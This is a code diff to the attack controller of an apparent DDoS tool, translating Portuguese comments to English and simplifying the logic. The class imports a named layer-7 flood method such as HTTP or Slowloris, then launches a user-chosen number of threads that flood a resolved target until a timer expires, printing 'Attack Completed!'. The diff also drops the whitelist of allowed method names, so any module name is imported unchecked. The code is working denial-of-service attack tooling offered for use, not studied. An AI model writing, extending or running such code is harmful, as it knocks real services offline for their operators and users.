@@ -1,81 +1,70 @@
-# Importar modulos
+import sys
 from threading import Thread
 from time import sleep, time
 
 from colorama import Fore
 from humanfriendly import Spinner, format_timespan
 
-from tools.crash import CriticalError
 from tools.ipTools import GetTargetAddress, InternetConnectionCheck
 
-""" Procura e encontra o metodo DDOS """
 
-
+# Returns the flood method attack
 def GetMethodByName(method):
 
-    if method in ("HTTP", "SLOWLORIS"):
-        dir = f"tools.L7.{method.lower()}"
-    else:
-        raise SystemExit(
-            f"{Fore.RED}[!] {Fore.MAGENTA}Unknown DDOS method... {repr(method)} selected..{Fore.RESET}"
-        )
+    dir = f"tools.L7.{method.lower()}"
     module = __import__(dir, fromlist=["object"])
-    if hasattr(module, "flood"):
-        method = getattr(module, "flood")
-        return method
-    else:
-        CriticalError(f"'Flood' method not found in {repr(dir)}. Use Python 3.8", "-")
-
-    """ Class para controlar os metodos de ataque """
+    method = getattr(module, "flood")
+    return method
 
 
+# Controls the attack methods
 class AttackMethod:
 
     # Constructor
-    def __init__(self, name, duration, threads, target):
-        self.name = name
+    def __init__(self, method_name, duration, threads, target):
+        self.method_name = method_name
         self.duration = duration
         self.threads_count = threads
-        self.target_name = target
         self.target = target
         self.threads = []
         self.is_running = False
 
-    # Entrada
+    # Entry-point
     def __enter__(self):
         InternetConnectionCheck()
-        self.method = GetMethodByName(self.name)
-        self.target = GetTargetAddress(self.target_name, self.name)
+        self.method = GetMethodByName(self.method_name)
+        self.target = GetTargetAddress(self.target, self.method_name)
         return self
 
-    # Saida
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Completed!{Fore.RESET}")
+    # Exit-point
+    def __exit__(self, exc_type, exc_value, traceback):
+        pass
 
-    # Verifica de tempo de execução
+    # Verifies the execution time
     def __RunTimer(self):
         __stopTime = time() + self.duration
         while time() < __stopTime:
-            if not self.is_running:
-                return
             sleep(1)
         self.is_running = False
 
-    # Inicia o flooder
+    # Starts the flooder
     def __RunFlood(self):
         while self.is_running:
             self.method(self.target)
 
-    # Inicia as threads
+    # Starts the threads
     def __RunThreads(self):
-        # Inicia o tempo das threads
-        thread = Thread(target=self.__RunTimer)
-        thread.start()
-        # Cria o flood das threads
+
+        # Starts threads timing
+        timing = Thread(target=self.__RunTimer)
+        timing.start()
+
+        # Creates the threads flood
         for _ in range(self.threads_count):
             thread = Thread(target=self.__RunFlood)
             self.threads.append(thread)
-        # Inicia o flood de threads
+
+        # Starts the threads flood
         with Spinner(
             label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
             total=100,
@@ -83,32 +72,46 @@ class AttackMethod:
             for index, thread in enumerate(self.threads):
                 thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
-        # Espera que o flood de threads termine
+
+        # Waits for the thread flood to end
         for index, thread in enumerate(self.threads):
             thread.join()
             print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread stopped {index + 1}.{Fore.RESET}"
+                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
             )
 
-    # Inicia o ataque DDOS
+        print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Completed!{Fore.RESET}")
+
+    # Starts DDOS attack
     def Start(self):
 
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting the attack {target} using the method {self.name}.{Fore.RESET}\n"
+            f"{Fore.MAGENTA}[?] {Fore.BLUE}Attacking {target} using the {self.method_name} method.{Fore.RESET}\n"
             f"{Fore.MAGENTA}[?] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
         )
+
         self.is_running = True
+
         try:
             self.__RunThreads()
+
         except KeyboardInterrupt:
+
             self.is_running = False
             print(
                 f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads..{Fore.RESET}"
             )
-            # Espera que as threads terminem
+
+            # Waits for the threads to end
             for thread in self.threads:
-                thread.join()
+                if thread.is_alive():
+                    thread.join()
+            
+            print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack Interrupted!{Fore.RESET}")
+
         except Exception as err:
+
             print(err)
+            sys.exit(1)
